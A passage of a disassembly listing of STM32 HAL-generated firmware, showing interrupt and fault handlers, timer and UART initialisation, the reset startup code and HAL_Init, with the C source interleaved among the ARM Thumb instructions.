void NMI_Handler(void)
{
 8000e2c:	b480      	push	{r7}
 8000e2e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000e30:	e7fe      	b.n	8000e30 <NMI_Handler+0x4>

08000e32 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000e32:	b480      	push	{r7}
 8000e34:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000e36:	e7fe      	b.n	8000e36 <HardFault_Handler+0x4>

08000e38 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000e38:	b480      	push	{r7}
 8000e3a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000e3c:	e7fe      	b.n	8000e3c <MemManage_Handler+0x4>

08000e3e <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000e3e:	b480      	push	{r7}
 8000e40:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000e42:	e7fe      	b.n	8000e42 <BusFault_Handler+0x4>

08000e44 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000e44:	b480      	push	{r7}
 8000e46:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000e48:	e7fe      	b.n	8000e48 <UsageFault_Handler+0x4>

08000e4a <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000e4a:	b480      	push	{r7}
 8000e4c:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000e4e:	bf00      	nop
 8000e50:	46bd      	mov	sp, r7
 8000e52:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e56:	4770      	bx	lr

08000e58 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000e58:	b480      	push	{r7}
 8000e5a:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000e5c:	bf00      	nop
 8000e5e:	46bd      	mov	sp, r7
 8000e60:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e64:	4770      	bx	lr

08000e66 <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000e66:	b480      	push	{r7}
 8000e68:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000e6a:	bf00      	nop
 8000e6c:	46bd      	mov	sp, r7
 8000e6e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e72:	4770      	bx	lr

08000e74 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000e74:	b580      	push	{r7, lr}
 8000e76:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000e78:	f000 f9b2 	bl	80011e0 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000e7c:	bf00      	nop
 8000e7e:	bd80      	pop	{r7, pc}

08000e80 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000e80:	b580      	push	{r7, lr}
 8000e82:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000e84:	4802      	ldr	r0, [pc, #8]	; (8000e90 <TIM2_IRQHandler+0x10>)
 8000e86:	f003 ffc1 	bl	8004e0c <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000e8a:	bf00      	nop
 8000e8c:	bd80      	pop	{r7, pc}
 8000e8e:	bf00      	nop
 8000e90:	200002e4 	.word	0x200002e4

08000e94 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000e94:	b580      	push	{r7, lr}
 8000e96:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000e98:	4802      	ldr	r0, [pc, #8]	; (8000ea4 <USB_IRQHandler+0x10>)
 8000e9a:	f001 f819 	bl	8001ed0 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8000e9e:	bf00      	nop
 8000ea0:	bd80      	pop	{r7, pc}
 8000ea2:	bf00      	nop
 8000ea4:	20000b7c 	.word	0x20000b7c

08000ea8 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8000ea8:	b480      	push	{r7}
 8000eaa:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8000eac:	4b06      	ldr	r3, [pc, #24]	; (8000ec8 <SystemInit+0x20>)
 8000eae:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8000eb2:	4a05      	ldr	r2, [pc, #20]	; (8000ec8 <SystemInit+0x20>)
 8000eb4:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8000eb8:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8000ebc:	bf00      	nop
 8000ebe:	46bd      	mov	sp, r7
 8000ec0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000ec4:	4770      	bx	lr
 8000ec6:	bf00      	nop
 8000ec8:	e000ed00 	.word	0xe000ed00

08000ecc <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8000ecc:	b580      	push	{r7, lr}
 8000ece:	b088      	sub	sp, #32
 8000ed0:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8000ed2:	f107 0310 	add.w	r3, r7, #16
 8000ed6:	2200      	movs	r2, #0
 8000ed8:	601a      	str	r2, [r3, #0]
 8000eda:	605a      	str	r2, [r3, #4]
 8000edc:	609a      	str	r2, [r3, #8]
 8000ede:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8000ee0:	1d3b      	adds	r3, r7, #4
 8000ee2:	2200      	movs	r2, #0
 8000ee4:	601a      	str	r2, [r3, #0]
 8000ee6:	605a      	str	r2, [r3, #4]
 8000ee8:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8000eea:	4b1e      	ldr	r3, [pc, #120]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000eec:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000ef0:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8000ef2:	4b1c      	ldr	r3, [pc, #112]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000ef4:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8000ef8:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8000efa:	4b1a      	ldr	r3, [pc, #104]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000efc:	2200      	movs	r2, #0
 8000efe:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8000f00:	4b18      	ldr	r3, [pc, #96]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000f02:	f240 128f 	movw	r2, #399	; 0x18f
 8000f06:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8000f08:	4b16      	ldr	r3, [pc, #88]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000f0a:	2200      	movs	r2, #0
 8000f0c:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8000f0e:	4b15      	ldr	r3, [pc, #84]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000f10:	2200      	movs	r2, #0
 8000f12:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8000f14:	4813      	ldr	r0, [pc, #76]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000f16:	f003 fece 	bl	8004cb6 <HAL_TIM_Base_Init>
 8000f1a:	4603      	mov	r3, r0
 8000f1c:	2b00      	cmp	r3, #0
 8000f1e:	d001      	beq.n	8000f24 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8000f20:	f7ff feda 	bl	8000cd8 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8000f24:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000f28:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8000f2a:	f107 0310 	add.w	r3, r7, #16
 8000f2e:	4619      	mov	r1, r3
 8000f30:	480c      	ldr	r0, [pc, #48]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000f32:	f004 f86d 	bl	8005010 <HAL_TIM_ConfigClockSource>
 8000f36:	4603      	mov	r3, r0
 8000f38:	2b00      	cmp	r3, #0
 8000f3a:	d001      	beq.n	8000f40 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8000f3c:	f7ff fecc 	bl	8000cd8 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8000f40:	2300      	movs	r3, #0
 8000f42:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8000f44:	2300      	movs	r3, #0
 8000f46:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8000f48:	1d3b      	adds	r3, r7, #4
 8000f4a:	4619      	mov	r1, r3
 8000f4c:	4805      	ldr	r0, [pc, #20]	; (8000f64 <MX_TIM2_Init+0x98>)
 8000f4e:	f004 fa4f 	bl	80053f0 <HAL_TIMEx_MasterConfigSynchronization>
 8000f52:	4603      	mov	r3, r0
 8000f54:	2b00      	cmp	r3, #0
 8000f56:	d001      	beq.n	8000f5c <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8000f58:	f7ff febe 	bl	8000cd8 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8000f5c:	bf00      	nop
 8000f5e:	3720      	adds	r7, #32
 8000f60:	46bd      	mov	sp, r7
 8000f62:	bd80      	pop	{r7, pc}
 8000f64:	200002e4 	.word	0x200002e4

08000f68 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8000f68:	b580      	push	{r7, lr}
 8000f6a:	b084      	sub	sp, #16
 8000f6c:	af00      	add	r7, sp, #0
 8000f6e:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8000f70:	687b      	ldr	r3, [r7, #4]
 8000f72:	681b      	ldr	r3, [r3, #0]
 8000f74:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8000f78:	d113      	bne.n	8000fa2 <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8000f7a:	4b0c      	ldr	r3, [pc, #48]	; (8000fac <HAL_TIM_Base_MspInit+0x44>)
 8000f7c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f7e:	4a0b      	ldr	r2, [pc, #44]	; (8000fac <HAL_TIM_Base_MspInit+0x44>)
 8000f80:	f043 0301 	orr.w	r3, r3, #1
 8000f84:	6593      	str	r3, [r2, #88]	; 0x58
 8000f86:	4b09      	ldr	r3, [pc, #36]	; (8000fac <HAL_TIM_Base_MspInit+0x44>)
 8000f88:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f8a:	f003 0301 	and.w	r3, r3, #1
 8000f8e:	60fb      	str	r3, [r7, #12]
 8000f90:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 8000f92:	2200      	movs	r2, #0
 8000f94:	2100      	movs	r1, #0
 8000f96:	201c      	movs	r0, #28
 8000f98:	f000 fa41 	bl	800141e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8000f9c:	201c      	movs	r0, #28
 8000f9e:	f000 fa5a 	bl	8001456 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8000fa2:	bf00      	nop
 8000fa4:	3710      	adds	r7, #16
 8000fa6:	46bd      	mov	sp, r7
 8000fa8:	bd80      	pop	{r7, pc}
 8000faa:	bf00      	nop
 8000fac:	40021000 	.word	0x40021000

08000fb0 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8000fb0:	b580      	push	{r7, lr}
 8000fb2:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8000fb4:	4b14      	ldr	r3, [pc, #80]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fb6:	4a15      	ldr	r2, [pc, #84]	; (800100c <MX_USART2_UART_Init+0x5c>)
 8000fb8:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8000fba:	4b13      	ldr	r3, [pc, #76]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fbc:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8000fc0:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8000fc2:	4b11      	ldr	r3, [pc, #68]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fc4:	2200      	movs	r2, #0
 8000fc6:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8000fc8:	4b0f      	ldr	r3, [pc, #60]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fca:	2200      	movs	r2, #0
 8000fcc:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8000fce:	4b0e      	ldr	r3, [pc, #56]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fd0:	2200      	movs	r2, #0
 8000fd2:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8000fd4:	4b0c      	ldr	r3, [pc, #48]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fd6:	220c      	movs	r2, #12
 8000fd8:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8000fda:	4b0b      	ldr	r3, [pc, #44]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fdc:	2200      	movs	r2, #0
 8000fde:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8000fe0:	4b09      	ldr	r3, [pc, #36]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fe2:	2200      	movs	r2, #0
 8000fe4:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8000fe6:	4b08      	ldr	r3, [pc, #32]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fe8:	2200      	movs	r2, #0
 8000fea:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8000fec:	4b06      	ldr	r3, [pc, #24]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000fee:	2200      	movs	r2, #0
 8000ff0:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8000ff2:	4805      	ldr	r0, [pc, #20]	; (8001008 <MX_USART2_UART_Init+0x58>)
 8000ff4:	f004 fa80 	bl	80054f8 <HAL_UART_Init>
 8000ff8:	4603      	mov	r3, r0
 8000ffa:	2b00      	cmp	r3, #0
 8000ffc:	d001      	beq.n	8001002 <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8000ffe:	f7ff fe6b 	bl	8000cd8 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8001002:	bf00      	nop
 8001004:	bd80      	pop	{r7, pc}
 8001006:	bf00      	nop
 8001008:	20000330 	.word	0x20000330
 800100c:	40004400 	.word	0x40004400

08001010 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8001010:	b580      	push	{r7, lr}
 8001012:	b09e      	sub	sp, #120	; 0x78
 8001014:	af00      	add	r7, sp, #0
 8001016:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8001018:	f107 0364 	add.w	r3, r7, #100	; 0x64
 800101c:	2200      	movs	r2, #0
 800101e:	601a      	str	r2, [r3, #0]
 8001020:	605a      	str	r2, [r3, #4]
 8001022:	609a      	str	r2, [r3, #8]
 8001024:	60da      	str	r2, [r3, #12]
 8001026:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8001028:	f107 0310 	add.w	r3, r7, #16
 800102c:	2254      	movs	r2, #84	; 0x54
 800102e:	2100      	movs	r1, #0
 8001030:	4618      	mov	r0, r3
 8001032:	f00b ffff 	bl	800d034 <memset>
  if(uartHandle->Instance==USART2)
 8001036:	687b      	ldr	r3, [r7, #4]
 8001038:	681b      	ldr	r3, [r3, #0]
 800103a:	4a28      	ldr	r2, [pc, #160]	; (80010dc <HAL_UART_MspInit+0xcc>)
 800103c:	4293      	cmp	r3, r2
 800103e:	d148      	bne.n	80010d2 <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8001040:	2302      	movs	r3, #2
 8001042:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8001044:	2300      	movs	r3, #0
 8001046:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8001048:	f107 0310 	add.w	r3, r7, #16
 800104c:	4618      	mov	r0, r3
 800104e:	f003 fa97 	bl	8004580 <HAL_RCCEx_PeriphCLKConfig>
 8001052:	4603      	mov	r3, r0
 8001054:	2b00      	cmp	r3, #0
 8001056:	d001      	beq.n	800105c <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8001058:	f7ff fe3e 	bl	8000cd8 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 800105c:	4b20      	ldr	r3, [pc, #128]	; (80010e0 <HAL_UART_MspInit+0xd0>)
 800105e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001060:	4a1f      	ldr	r2, [pc, #124]	; (80010e0 <HAL_UART_MspInit+0xd0>)
 8001062:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001066:	6593      	str	r3, [r2, #88]	; 0x58
 8001068:	4b1d      	ldr	r3, [pc, #116]	; (80010e0 <HAL_UART_MspInit+0xd0>)
 800106a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800106c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001070:	60fb      	str	r3, [r7, #12]
 8001072:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8001074:	4b1a      	ldr	r3, [pc, #104]	; (80010e0 <HAL_UART_MspInit+0xd0>)
 8001076:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001078:	4a19      	ldr	r2, [pc, #100]	; (80010e0 <HAL_UART_MspInit+0xd0>)
 800107a:	f043 0301 	orr.w	r3, r3, #1
 800107e:	64d3      	str	r3, [r2, #76]	; 0x4c
 8001080:	4b17      	ldr	r3, [pc, #92]	; (80010e0 <HAL_UART_MspInit+0xd0>)
 8001082:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001084:	f003 0301 	and.w	r3, r3, #1
 8001088:	60bb      	str	r3, [r7, #8]
 800108a:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 800108c:	2304      	movs	r3, #4
 800108e:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001090:	2302      	movs	r3, #2
 8001092:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001094:	2300      	movs	r3, #0
 8001096:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001098:	2303      	movs	r3, #3
 800109a:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 800109c:	2307      	movs	r3, #7
 800109e:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 80010a0:	f107 0364 	add.w	r3, r7, #100	; 0x64
 80010a4:	4619      	mov	r1, r3
 80010a6:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80010aa:	f000 fc67 	bl	800197c <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 80010ae:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80010b2:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 80010b4:	2302      	movs	r3, #2
 80010b6:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 80010b8:	2300      	movs	r3, #0
 80010ba:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 80010bc:	2303      	movs	r3, #3
 80010be:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 80010c0:	2303      	movs	r3, #3
 80010c2:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 80010c4:	f107 0364 	add.w	r3, r7, #100	; 0x64
 80010c8:	4619      	mov	r1, r3
 80010ca:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80010ce:	f000 fc55 	bl	800197c <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 80010d2:	bf00      	nop
 80010d4:	3778      	adds	r7, #120	; 0x78
 80010d6:	46bd      	mov	sp, r7
 80010d8:	bd80      	pop	{r7, pc}
 80010da:	bf00      	nop
 80010dc:	40004400 	.word	0x40004400
 80010e0:	40021000 	.word	0x40021000

080010e4 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 80010e4:	f8df d034 	ldr.w	sp, [pc, #52]	; 800111c <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 80010e8:	f7ff fede 	bl	8000ea8 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 80010ec:	480c      	ldr	r0, [pc, #48]	; (8001120 <LoopForever+0x6>)
  ldr r1, =_edata
 80010ee:	490d      	ldr	r1, [pc, #52]	; (8001124 <LoopForever+0xa>)
  ldr r2, =_sidata
 80010f0:	4a0d      	ldr	r2, [pc, #52]	; (8001128 <LoopForever+0xe>)
  movs r3, #0
 80010f2:	2300      	movs	r3, #0
  b LoopCopyDataInit
 80010f4:	e002      	b.n	80010fc <LoopCopyDataInit>

080010f6 <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 80010f6:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 80010f8:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 80010fa:	3304      	adds	r3, #4

080010fc <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 80010fc:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 80010fe:	428c      	cmp	r4, r1
  bcc CopyDataInit
 8001100:	d3f9      	bcc.n	80010f6 <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 8001102:	4a0a      	ldr	r2, [pc, #40]	; (800112c <LoopForever+0x12>)
  ldr r4, =_ebss
 8001104:	4c0a      	ldr	r4, [pc, #40]	; (8001130 <LoopForever+0x16>)
  movs r3, #0
 8001106:	2300      	movs	r3, #0
  b LoopFillZerobss
 8001108:	e001      	b.n	800110e <LoopFillZerobss>

0800110a <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 800110a:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 800110c:	3204      	adds	r2, #4

0800110e <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 800110e:	42a2      	cmp	r2, r4
  bcc FillZerobss
 8001110:	d3fb      	bcc.n	800110a <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 8001112:	f00b ff97 	bl	800d044 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 8001116:	f7ff fa37 	bl	8000588 <main>

0800111a <LoopForever>:

LoopForever:
    b LoopForever
 800111a:	e7fe      	b.n	800111a <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 800111c:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 8001120:	20000000 	.word	0x20000000
  ldr r1, =_edata
 8001124:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 8001128:	0800d2f8 	.word	0x0800d2f8
  ldr r2, =_sbss
 800112c:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 8001130:	20001f14 	.word	0x20001f14

08001134 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 8001134:	e7fe      	b.n	8001134 <ADC1_IRQHandler>

08001136 <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 8001136:	b580      	push	{r7, lr}
 8001138:	b082      	sub	sp, #8
 800113a:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 800113c:	2300      	movs	r3, #0
 800113e:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 8001140:	2003      	movs	r0, #3
 8001142:	f000 f961 	bl	8001408 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 8001146:	2000      	movs	r0, #0
 8001148:	f000 f80e 	bl	8001168 <HAL_InitTick>
 800114c:	4603      	mov	r3, r0
 800114e:	2b00      	cmp	r3, #0
 8001150:	d002      	beq.n	8001158 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 8001152:	2301      	movs	r3, #1
 8001154:	71fb      	strb	r3, [r7, #7]
 8001156:	e001      	b.n	800115c <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 8001158:	f7ff fe44 	bl	8000de4 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 800115c:	79fb      	ldrb	r3, [r7, #7]
}
 800115e:	4618      	mov	r0, r3
 8001160:	3708      	adds	r7, #8
